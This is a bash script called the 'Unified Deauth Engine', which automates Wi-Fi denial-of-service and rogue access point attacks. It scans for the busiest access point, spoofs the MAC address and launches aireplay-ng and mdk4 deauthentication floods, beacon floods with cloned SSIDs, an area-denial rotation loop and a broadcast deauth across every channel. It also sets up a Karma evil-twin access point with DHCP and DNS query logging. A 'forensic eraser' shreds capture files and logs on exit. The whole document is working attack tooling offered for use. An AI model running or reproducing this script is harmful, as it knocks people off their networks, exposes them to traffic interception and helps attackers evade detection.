#!/bin/bash
# ==============================================================================
# Unified Deauth Engine
# Combines:
# - Module 1: RF-Environment Engine (Interface Dominance)
# - Module 2: Tactical Recon & Target Pinpointing (Scanning)
# - Module 3: The Black-Out Engine (Multi-Vector Deauth)
# ==============================================================================

if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root." 
   exit 1
fi

IFACE=$1

if [ -z "$IFACE" ]; then
    echo "Usage: $0 <interface>"
    echo "Example: $0 wlan0"
    exit 1
fi

# Globals
CSV_PREFIX="/tmp/recon_capture"
CSV_FILE="${CSV_PREFIX}-01.csv"
SUPPRESS_PID=""
WATCHDOG_PID=""
CAPTURE_PID=""
ATTACK_PIDS=()
TARGET_BSSID=""
TARGET_CHANNEL=""

# ==============================================================================
# MODULE 8: The Forensic Eraser & Exit Protocol (Kill-Switch)
# ==============================================================================
cleanup() {
    echo -e "\n\e[1;31m[!!!] KILL-SWITCH ACTIVATED: Executing Forensic Eraser [!!!]\e[0m"
    tput cvvis 2>/dev/null
    
    if [ -n "$CAPTURE_PID" ]; then kill $CAPTURE_PID 2>/dev/null; fi
    if [ -n "$SUPPRESS_PID" ]; then kill $SUPPRESS_PID 2>/dev/null; fi
    if [ -n "$WATCHDOG_PID" ]; then kill $WATCHDOG_PID 2>/dev/null; fi
    if [ -n "$GUARDIAN_PID" ]; then kill $GUARDIAN_PID 2>/dev/null; fi
    if [ ${#ATTACK_PIDS[@]} -gt 0 ]; then kill "${ATTACK_PIDS[@]}" 2>/dev/null; fi
    
    killall mdk4 aireplay-ng airodump-ng hostapd dnsmasq 2>/dev/null
    
    echo "[*] Scrubbing temporary capture data and logs from /tmp/..."
    # Securely shred and remove files
    for file in ${CSV_PREFIX}-* /tmp/custom_ssids.txt /tmp/cloned_ssids.txt /tmp/ap_stack.txt /tmp/current_target.txt /tmp/hostapd.conf /tmp/dnsmasq.conf; do
        if ls $file 1> /dev/null 2>&1; then
            shred -u $file 2>/dev/null || rm -rf $file
        fi
    done
    
    echo "[*] Restoring interface $IFACE to original MAC and managed mode..."
    airmon-ng stop "$IFACE" >/dev/null 2>&1
    ip link set "$IFACE" down 2>/dev/null
    
    # Tear down secondary interface if created
    iw dev "${IFACE}_ap" del >/dev/null 2>&1
    
    macchanger -p "$IFACE" >/dev/null 2>&1
    iw dev "$IFACE" set type managed 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    
    echo "[*] Restoring system state (unmasking NetworkManager)..."
    systemctl unmask NetworkManager >/dev/null 2>&1
    systemctl start NetworkManager >/dev/null 2>&1
    systemctl unmask wpa_supplicant >/dev/null 2>&1
    systemctl start wpa_supplicant >/dev/null 2>&1
    
    echo -e "\e[1;32m[+] Hardware Scrubbing Complete. Terminal closing instantly.\e[0m"
    exit 0
}

# Trap Ctrl+C (SIGINT), Ctrl+\ (SIGQUIT) and SIGTERM as the Kill-Switch
trap cleanup SIGINT SIGTERM SIGQUIT

# ==============================================================================
# MODULE 1: RF-Environment Engine
# ==============================================================================
suppress_managers() {
    echo "[*] Running initial airmon-ng check kill..."
    airmon-ng check kill >/dev/null 2>&1
    
    # Intel iwlwifi specific handling: unload and reload driver to clear state
    # This often fixes issues with Intel cards getting stuck during mode transitions
    if lsmod | grep -q "iwlwifi"; then
        echo "[*] Detected Intel (iwlwifi) card. Reloading driver for clean state..."
        rmmod iwlmvm iwlwifi 2>/dev/null
        sleep 1
        modprobe iwlwifi 2>/dev/null
        sleep 2
    fi
    
    echo "[*] Starting recursive suppression loop in background..."
    while true; do
        killall NetworkManager wpa_supplicant dhclient 2>/dev/null
        sleep 5
    done
}

enable_monitor_mode() {
    echo "[*] Bringing interface $IFACE down..."
    ip link set "$IFACE" down
    sleep 1

    echo "[*] Spoofing MAC address..."
    macchanger -r "$IFACE" >/dev/null 2>&1

    echo "[*] Setting monitor mode via iw..."
    iw dev "$IFACE" set type monitor

    echo "[*] Bringing interface $IFACE up..."
    ip link set "$IFACE" up
}

watchdog() {
    echo "[*] Starting self-healing watchdog for $IFACE..."
    while true; do
        TYPE=$(iw dev "$IFACE" info | grep -oP 'type \K\w+')
        if [ "$TYPE" == "managed" ]; then
            echo -e "\n\e[1;31m[!] Watchdog detected mode change to 'managed'! Re-triggering monitor mode...\e[0m"
            ip link set "$IFACE" down
            iw dev "$IFACE" set type monitor
            ip link set "$IFACE" up
        fi
        sleep 2
    done
}

# ==============================================================================
# MODULE 2: Tactical Recon & Target Pinpointing
# ==============================================================================
start_capture() {
    rm -f ${CSV_PREFIX}-*
    airodump-ng "$IFACE" --output-format csv --write "$CSV_PREFIX" > /dev/null 2>&1 &
    CAPTURE_PID=$!
}

stop_capture() {
    if [ -n "$CAPTURE_PID" ]; then
        kill $CAPTURE_PID 2>/dev/null
        wait $CAPTURE_PID 2>/dev/null
        CAPTURE_PID=""
    fi
}

parse_highest_client_ap() {
    if [ ! -f "$CSV_FILE" ]; then return; fi
    
    local top_bssid=$(awk -F ',' '
        BEGIN { in_stations = 0 }
        /^Station MAC/ { in_stations = 1; next }
        in_stations && NF >= 6 {
            bssid = $6
            gsub(/^[ \t]+|[ \t]+$/, "", bssid)
            if (bssid != "(not associated)" && length(bssid) == 17) {
                counts[bssid]++
            }
        }
        END {
            max = 0
            top = ""
            for (b in counts) {
                if (counts[b] > max) { max = counts[b]; top = b }
            }
            if (top != "") print top
        }
    ' "$CSV_FILE")
    
    if [ -n "$top_bssid" ]; then
        local top_ch=$(awk -F ',' -v b="$top_bssid" '
            BEGIN { in_aps = 1 }
            /^Station MAC/ { in_aps = 0; exit }
            in_aps && $1 ~ b {
                ch = $4; gsub(/^[ \t]+|[ \t]+$/, "", ch); print ch; exit
            }
        ' "$CSV_FILE")
        echo "$top_bssid|$top_ch"
    else
        echo "None|None"
    fi
}

display_recon_ui() {
    tput civis
    start_capture
    
    # 30 seconds of recon
    for i in {1..6}; do
        tput clear
        tput cup 0 0
        echo -e "\e[1;36m=== Tactical Recon & Target Pinpointing (Scanning Phase) ===\e[0m"
        echo "Interface: $IFACE | Time remaining: $(( 35 - i * 5 )) seconds..."
        echo "-------------------------------------------------------------------------------"
        printf "%-20s %-10s %-10s %-20s\n" "BSSID" "CH" "PWR" "ENC"
        echo "-------------------------------------------------------------------------------"
        
        if [ -f "$CSV_FILE" ]; then
            awk -F ',' '
                BEGIN { in_aps = 1 }
                /^Station MAC/ { in_aps = 0; exit }
                in_aps && NR > 2 && NF >= 9 {
                    bssid = $1; ch = $4; enc = $6; pwr = $9
                    gsub(/^[ \t]+|[ \t]+$/, "", bssid); gsub(/^[ \t]+|[ \t]+$/, "", ch)
                    gsub(/^[ \t]+|[ \t]+$/, "", enc); gsub(/^[ \t]+|[ \t]+$/, "", pwr)
                    if (length(bssid) == 17) {
                        printf "%-20s %-10s %-10s %-20s\n", bssid, ch, pwr, enc
                    }
                }
            ' "$CSV_FILE" | head -n 15
        else
            echo "Waiting for capture data..."
        fi
        
        echo "-------------------------------------------------------------------------------"
        local highest_ap_info=$(parse_highest_client_ap)
        local h_bssid=$(echo "$highest_ap_info" | cut -d'|' -f1)
        local h_ch=$(echo "$highest_ap_info" | cut -d'|' -f2)
        
        echo -e "\e[1;33m[!] AP with Highest Client Count:\e[0m"
        if [ "$h_bssid" != "None" ]; then
            echo "    -> BSSID: $h_bssid | Channel: $h_ch"
            TARGET_BSSID=$h_bssid
            TARGET_CHANNEL=$h_ch
        else
            echo "    -> Calculating / No clients detected yet..."
        fi
        echo "-------------------------------------------------------------------------------"
        sleep 5
    done
    
    stop_capture
    tput cvvis
}

selector_menu() {
    while true; do
        tput clear
        echo -e "\e[1;32m=== Recon Phase Complete ===\e[0m"
        echo "Suggested High-Value Target: $TARGET_BSSID (CH: $TARGET_CHANNEL)"
        echo "---------------------------------------"
        echo "Select Target Scope for Black-Out Engine:"
        echo "1) Single Target (Focus on specific BSSID)"
        echo "2) Specific Channel (Focus on a frequency band)"
        echo "3) Global Network List (Broadcast deauth all)"
        echo "4) Skip directly to Attack Menu"
        echo "5) Exit Engine"
        echo "---------------------------------------"
        
        read -p "Enter your choice [1-5]: " choice
        
        case $choice in
            1)
                read -p "Enter BSSID [$TARGET_BSSID]: " bssid_input
                TARGET_BSSID=${bssid_input:-$TARGET_BSSID}
                read -p "Enter Channel [$TARGET_CHANNEL]: " ch_input
                TARGET_CHANNEL=${ch_input:-$TARGET_CHANNEL}
                attack_aireplay "$TARGET_BSSID" "$TARGET_CHANNEL"
                break ;;
            2)
                read -p "Enter Channel to jam [$TARGET_CHANNEL]: " ch_input
                TARGET_CHANNEL=${ch_input:-$TARGET_CHANNEL}
                lock_channel "$TARGET_CHANNEL"
                attack_mdk4
                break ;;
            3)
                attack_nuclear
                break ;;
            4)
                break ;;
            5)
                cleanup ;;
            *)
                echo "[!] Invalid selection." ; sleep 1 ;;
        esac
    done
}

# ==============================================================================
# MODULE 4: The Channel-Lock & Persistence Guardian
# ==============================================================================
deep_lock_channel() {
    local ch=$1
    if [ -z "$ch" ]; then return; fi
    
    echo -e "\n\e[1;35m[*] Initiating Deep Locking Protocol on Channel $ch...\e[0m"
    
    # CRITICAL FIX: Ensure airodump-ng is dead, otherwise it will force channel hopping
    echo " -> Terminating any active airodump-ng background scanners..."
    stop_capture >/dev/null 2>&1
    killall airodump-ng >/dev/null 2>&1
    
    # System-level interference prevention
    echo " -> Masking NetworkManager to prevent OS-level channel hopping..."
    systemctl stop NetworkManager >/dev/null 2>&1
    systemctl mask NetworkManager >/dev/null 2>&1
    
    # Redundant channel enforcement
    echo " -> Enforcing channel lock via iw and iwconfig..."
    iw dev "$IFACE" set channel "$ch" >/dev/null 2>&1
    iwconfig "$IFACE" channel "$ch" >/dev/null 2>&1
}

keep_alive_guardian() {
    local attack_type=$1
    local bssid_list=$2
    local ch=$3
    local opts=$4
    
    echo "[*] Persistence Guardian: Keep-Alive loop started for $attack_type."
    while true; do
        sleep 2
        # Check if the attack process is still running
        if ! pgrep -x "$attack_type" > /dev/null; then
            echo -e "\n\e[1;31m[!] Guardian Detected Packet Drop / Process Death! Re-initializing instantly...\e[0m"
            deep_lock_channel "$ch"
            
            # Clear old PIDs
            kill "${ATTACK_PIDS[@]}" 2>/dev/null
            ATTACK_PIDS=()
            
            if [ "$attack_type" == "mdk4" ]; then
                mdk4 "$IFACE" d $opts &
                ATTACK_PIDS+=($!)
            elif [ "$attack_type" == "aireplay-ng" ]; then
                for bssid in $bssid_list; do
                    aireplay-ng --deauth 0 -a "$bssid" "$IFACE" > /dev/null 2>&1 &
                    ATTACK_PIDS+=($!)
                done
            fi
            echo "[+] Guardian successfully resurrected the attack process."
        fi
    done
}

# ==============================================================================
# MODULE 5: SSID Overlord (Mass Beacon Flooding)
# ==============================================================================
attack_beacon_flood() {
    echo -e "\n\e[1;31m=== Attack Vector C: SSID Overlord (Beacon Flood) ===\e[0m"
    echo "1) Random/Custom SSIDs (Clutter Scanners)"
    echo "2) Cloned SSIDs (Copy existing networks to cause confusion)"
    echo "------------------------------------------------"
    read -p "Select Beacon Mode [1-2]: " beacon_mode
    
    MDK_OPTS=""
    
    case $beacon_mode in
        1)
            echo "[*] Generating Custom SSID list..."
            read -p "Enter a base name (e.g., AIT_FREE_WIFI) or leave blank for random: " base_name
            
            rm -f /tmp/custom_ssids.txt
            if [ -n "$base_name" ]; then
                for i in {1..1000}; do
                    echo "${base_name}_${i}" >> /tmp/custom_ssids.txt
                done
            else
                for i in {1..1000}; do
                    # Generate random alphanumeric string
                    echo "Random_Net_$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)" >> /tmp/custom_ssids.txt
                done
            fi
            
            MDK_OPTS="-f /tmp/custom_ssids.txt"
            echo "[*] Launching MDK4 Beacon Flood with Custom SSIDs..."
            ;;
            
        2)
            echo "[*] Parsing CSV to clone existing SSIDs..."
            if [ -f "$CSV_FILE" ]; then
                rm -f /tmp/cloned_ssids.txt
                # Extract ESSIDs from the AP block
                awk -F ',' '
                    BEGIN { in_aps = 1 }
                    /^Station MAC/ { in_aps = 0; exit }
                    in_aps && NR > 2 && NF >= 14 {
                        essid = $14
                        gsub(/^[ \t]+|[ \t]+$/, "", essid)
                        if (length(essid) > 0) {
                            print essid
                        }
                    }
                ' "$CSV_FILE" > /tmp/cloned_ssids.txt
                
                # Check if we actually found any
                if [ -s /tmp/cloned_ssids.txt ]; then
                    MDK_OPTS="-f /tmp/cloned_ssids.txt"
                    echo "[*] Launching MDK4 Beacon Flood with Cloned SSIDs..."
                else
                    echo "[!] No SSIDs found in capture data. Defaulting to Random."
                    MDK_OPTS=""
                fi
            else
                echo "[!] No capture data found. Defaulting to Random."
                MDK_OPTS=""
            fi
            ;;
            
        *)
            echo "[!] Invalid selection. Returning to menu."
            sleep 1
            return
            ;;
    esac

    # 'b' mode in mdk4 is Beacon Flood
    mdk4 "$IFACE" b $MDK_OPTS &
    ATTACK_PIDS+=($!)
    
    # Start Keep-Alive Guardian for Beacon Flood
    keep_alive_guardian "mdk4" "" "" "b $MDK_OPTS" &
    GUARDIAN_PID=$!
    
    echo "[+] SSID Overlord active. Press Enter to stop attack and return to menu."
    read
    kill $GUARDIAN_PID 2>/dev/null
    kill "${ATTACK_PIDS[@]}" 2>/dev/null; ATTACK_PIDS=()
}

# ==============================================================================
# MODULE 3: The Black-Out Engine
# ==============================================================================
lock_channel() {
    local ch=$1
    if [ -z "$ch" ]; then return; fi
    # Instead of simple lock, use the deep locking logic from Module 4
    deep_lock_channel "$ch"
}

attack_mdk4() {
    echo -e "\n\e[1;31m=== Attack Vector A: MDK4 Chaos ===\e[0m"
    read -p "Use Blacklist (b) or Whitelist (w) or None (n)? [b/w/n]: " bw_mode
    
    MDK_OPTS=""
    if [ "$bw_mode" == "b" ]; then
        read -p "Enter path to MAC blacklist file: " list_file
        if [ -f "$list_file" ]; then MDK_OPTS="-b $list_file"; fi
    elif [ "$bw_mode" == "w" ]; then
        read -p "Enter path to MAC whitelist file: " list_file
        if [ -f "$list_file" ]; then MDK_OPTS="-w $list_file"; fi
    fi

    echo "[*] Launching MDK4 destructive deauth mode on current channel..."
    mdk4 "$IFACE" d $MDK_OPTS &
    ATTACK_PIDS+=($!)
    
    # Start Keep-Alive Guardian
    keep_alive_guardian "mdk4" "" "$TARGET_CHANNEL" "$MDK_OPTS" &
    GUARDIAN_PID=$!
    
    echo "[+] MDK4 Attack running in background. Press Enter to return to menu."
    read
    kill $GUARDIAN_PID 2>/dev/null
    kill "${ATTACK_PIDS[@]}" 2>/dev/null; ATTACK_PIDS=()
}

attack_aireplay() {
    local bssid_list=$1
    local ch=$2
    
    echo -e "\n\e[1;31m=== Attack Vector B: Directed Aireplay ===\e[0m"
    if [ -z "$bssid_list" ]; then
        read -p "Enter Target BSSID(s) separated by space: " bssid_list
    fi
    if [ -z "$ch" ]; then
        read -p "Enter Target Channel: " ch
    fi
    
    lock_channel "$ch"
    
    echo "[*] Spawning aireplay-ng threads..."
    for bssid in $bssid_list; do
        echo " -> Starting deauth thread for $bssid"
        aireplay-ng --deauth 0 -a "$bssid" "$IFACE" > /dev/null 2>&1 &
        ATTACK_PIDS+=($!)
    done
    
    # Start Keep-Alive Guardian
    keep_alive_guardian "aireplay-ng" "$bssid_list" "$ch" "" &
    GUARDIAN_PID=$!
    
    echo "[+] Threads running. Press Enter to stop attack and return to menu."
    read
    kill $GUARDIAN_PID 2>/dev/null
    kill "${ATTACK_PIDS[@]}" 2>/dev/null; ATTACK_PIDS=()
}

attack_nuclear() {
    echo -e "\n\e[1;31m=== NUCLEAR OPTION INITIATED ===\e[0m"
    echo "[!] Warning: This will aggressively broadcast deauth across all channels."
    
    CHANNELS=(1 2 3 4 5 6 7 8 9 10 11 12 13 14 36 40 44 48 149 153 157 161 165)
    read -p "Enter path to target BSSID list (leave blank for broadcast FF:FF:FF:FF:FF:FF): " list_file
    
    echo "[*] Starting channel hopping loop in background..."
    (
        while true; do
            for ch in "${CHANNELS[@]}"; do
                lock_channel "$ch" > /dev/null 2>&1
                
                if [ -n "$list_file" ] && [ -f "$list_file" ]; then
                    while read -r bssid; do
                        if [ -n "$bssid" ]; then
                            aireplay-ng --deauth 50 -a "$bssid" "$IFACE" > /dev/null 2>&1 &
                        fi
                    done < "$list_file"
                else
                    aireplay-ng --deauth 50 -a FF:FF:FF:FF:FF:FF "$IFACE" > /dev/null 2>&1 &
                fi
                sleep 1
            done
        done
    ) &
    ATTACK_PIDS+=($!)
    
    echo "[+] Nuclear Option running. Press Enter to stop attack and return to menu."
    read
    kill "${ATTACK_PIDS[@]}" 2>/dev/null; ATTACK_PIDS=()
    killall aireplay-ng 2>/dev/null
}

attack_menu() {
    while true; do
        tput clear
        echo -e "\e[1;31m=== The Black-Out Engine (Multi-Vector Deauth) ===\e[0m"
        echo "Interface: $IFACE"
        echo "------------------------------------------------"
        echo "1) Attack Vector A: MDK4 Chaos (Destructive Flood)"
        echo "2) Attack Vector B: Directed Aireplay (Multi-threaded)"
        echo "3) Attack Vector C: SSID Overlord (Beacon Flood)"
        echo "4) Attack Vector D: Area-Denial Rotation Loop"
        echo "5) Attack Vector E: Karma AP (Evil Twin)"
        echo "6) Nuclear Option: Global Channel Hopping"
        echo "7) Return to Recon Phase"
        echo "8) Kill-Switch (Forensic Exit)"
        echo "------------------------------------------------"
        read -p "Select Attack Vector [1-8]: " choice
        
        case $choice in
            1) attack_mdk4 ;;
            2) attack_aireplay "" "" ;;
            3) attack_beacon_flood ;;
            4) attack_area_denial ;;
            5) attack_karma_ap ;;
            6) attack_nuclear ;;
            7) display_recon_ui ; selector_menu ;;
            8) cleanup ;;
            *) echo "Invalid option." ; sleep 1 ;;
        esac
    done
}

# ==============================================================================
# MODULE 7: The "Area-Denial" Rotation Loop
# ==============================================================================
attack_area_denial() {
    echo -e "\n\e[1;31m=== Attack Vector D: Area-Denial Rotation Loop ===\e[0m"
    echo "[*] Initializing Target Rotation Engine..."
    
    if [ ! -f "$CSV_FILE" ]; then
        echo "[!] No capture data found. Please run Recon Phase first."
        sleep 2
        return
    fi
    
    echo "[*] Parsing APs and sorting by RSSI (Smart-Targeting)..."
    rm -f /tmp/ap_stack.txt
    
    # Parse CSV for BSSID, Channel, Power.
    # We want highest power first (closest to 0).
    awk -F ',' '
        BEGIN { in_aps = 1 }
        /^Station MAC/ { in_aps = 0; exit }
        in_aps && NR > 2 && NF >= 9 {
            bssid = $1; ch = $4; pwr = $9
            gsub(/^[ \t]+|[ \t]+$/, "", bssid); gsub(/^[ \t]+|[ \t]+$/, "", ch); gsub(/^[ \t]+|[ \t]+$/, "", pwr)
            if (length(bssid) == 17 && pwr < 0) {
                print pwr "|" bssid "|" ch
            }
        }
    ' "$CSV_FILE" | sort -nr -t'|' -k1 > /tmp/ap_stack.txt
    
    if [ ! -s /tmp/ap_stack.txt ]; then
        echo "[!] No valid targets found in capture data."
        sleep 2
        return
    fi
    
    # Read stack into array
    mapfile -t AP_STACK < /tmp/ap_stack.txt
    TOTAL_TARGETS=${#AP_STACK[@]}
    
    echo "[+] Found $TOTAL_TARGETS targets. Commencing Sweep-and-Strike protocol..."
    sleep 2
    
    tput civis
    
    echo "[?] Enable simultaneous SSID Overlord (Mass Beacon Flood) during rotation? [y/N]: "
    read sim_flood
    
    if [[ "$sim_flood" =~ ^[Yy]$ ]]; then
        echo "[*] Initializing concurrent SSID Overlord..."
        awk -F ',' '
            BEGIN { in_aps = 1 }
            /^Station MAC/ { in_aps = 0; exit }
            in_aps && NR > 2 && NF >= 14 {
                essid = $14
                gsub(/^[ \t]+|[ \t]+$/, "", essid)
                if (length(essid) > 0) print essid
            }
        ' "$CSV_FILE" > /tmp/cloned_ssids.txt
        mdk4 "$IFACE" b -f /tmp/cloned_ssids.txt >/dev/null 2>&1 &
        BEACON_PID=$!
        ATTACK_PIDS+=($BEACON_PID)
    fi
    
    while true; do
        for (( i=0; i<$TOTAL_TARGETS; i++ )); do
            CURRENT_INFO=${AP_STACK[$i]}
            PWR=$(echo "$CURRENT_INFO" | cut -d'|' -f1)
            BSSID=$(echo "$CURRENT_INFO" | cut -d'|' -f2)
            CH=$(echo "$CURRENT_INFO" | cut -d'|' -f3)
            
            NEXT_INDEX=$(( (i + 1) % TOTAL_TARGETS ))
            NEXT_INFO=${AP_STACK[$NEXT_INDEX]}
            NEXT_BSSID=$(echo "$NEXT_INFO" | cut -d'|' -f2)
            
            deep_lock_channel "$CH" >/dev/null 2>&1
            
            # Create a whitelist for just this BSSID to focus the attack
            echo "$BSSID" > /tmp/current_target.txt
            mdk4 "$IFACE" d -w /tmp/current_target.txt >/dev/null 2>&1 &
            MDK_PID=$!
            ATTACK_PIDS+=($MDK_PID)
            
            for (( sec=30; sec>0; sec-- )); do
                tput clear
                echo -e "\e[1;31m=== Area-Denial Rotation Loop (Sweep-and-Strike) ===\e[0m"
                echo "Target $(((i+1))) of $TOTAL_TARGETS"
                echo "------------------------------------------------"
                echo -e "\e[1;32m[CURRENT STRIKE]\e[0m BSSID: $BSSID | CH: $CH | RSSI: $PWR"
                echo "Time Remaining: $sec seconds"
                echo "------------------------------------------------"
                echo -e "\e[1;33m[NEXT TARGET]\e[0m    BSSID: $NEXT_BSSID"
                if [[ "$sim_flood" =~ ^[Yy]$ ]]; then
                    echo -e "\e[1;36m[BACKGROUND]\e[0m     SSID Overlord is actively cloning networks"
                fi
                echo "------------------------------------------------"
                echo "Press Ctrl+C to trigger Kill-Switch and Exit."
                sleep 1
            done
            
            kill $MDK_PID 2>/dev/null
            ATTACK_PIDS=()
            if [[ "$sim_flood" =~ ^[Yy]$ ]]; then
                ATTACK_PIDS+=($BEACON_PID)
            fi
        done
    done
    
    tput cvvis
}

# ==============================================================================
# MODULE 6: The Karma AP (Evil Twin)
# ==============================================================================
attack_karma_ap() {
    echo -e "\n\e[1;31m=== Attack Vector E: Karma AP (Evil Twin) ===\e[0m"
    echo "[*] Initializing Evil Twin logic..."
    
    # Intel cards often struggle with concurrent AP and Monitor mode
    if lsmod | grep -q "iwlwifi"; then
        echo -e "\e[1;33m[WARNING] Intel (iwlwifi) cards often do not support simultaneous Monitor & AP mode.\e[0m"
        echo -e "\e[1;33mIf the AP fails to start, use a secondary physical adapter.\e[0m"
        sleep 2
    fi
    
    read -p "Enter ESSID for Rogue AP (e.g., 'Free WiFi'): " rogue_ssid
    read -p "Enter Channel for Rogue AP [1-11]: " rogue_ch
    
    KARMA_IFACE="${IFACE}_ap"
    echo "[*] Creating secondary virtual interface ($KARMA_IFACE) for AP mode..."
    iw dev "$IFACE" interface add "$KARMA_IFACE" type managed >/dev/null 2>&1
    macchanger -r "$KARMA_IFACE" >/dev/null 2>&1
    
    # Create hostapd config
    cat <<EOF > /tmp/hostapd.conf
interface=$KARMA_IFACE
ssid=$rogue_ssid
channel=$rogue_ch
hw_mode=g
EOF

    # Create dnsmasq config
    cat <<EOF > /tmp/dnsmasq.conf
interface=$KARMA_IFACE
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

    echo "[*] Assigning IP 192.168.1.1 to $KARMA_IFACE..."
    ip addr add 192.168.1.1/24 dev "$KARMA_IFACE" >/dev/null 2>&1
    ip link set "$KARMA_IFACE" up >/dev/null 2>&1
    
    echo "[*] Starting dnsmasq..."
    dnsmasq -C /tmp/dnsmasq.conf -x /tmp/dnsmasq.pid >/dev/null 2>&1
    
    echo "[*] Starting hostapd..."
    hostapd /tmp/hostapd.conf >/dev/null 2>&1 &
    ATTACK_PIDS+=($!)
    
    echo -e "\e[1;32m[+] Karma AP Active on $KARMA_IFACE ($rogue_ssid).\e[0m"
    echo "Press Enter to stop AP and return to menu."
    read
    
    killall hostapd dnsmasq 2>/dev/null
    ip link set "$KARMA_IFACE" down >/dev/null 2>&1
    iw dev "$KARMA_IFACE" del >/dev/null 2>&1
    ATTACK_PIDS=()
}

# ==============================================================================
# MAIN EXECUTION FLOW
# ==============================================================================
echo -e "\e[1;32m=== Initializing Unified Deauth Engine ===\e[0m"

# Phase 1: RF-Environment Setup
suppress_managers &
SUPPRESS_PID=$!
enable_monitor_mode
watchdog &
WATCHDOG_PID=$!

# Phase 2: Recon
display_recon_ui
selector_menu

# Phase 3: Attack Engine
attack_menu
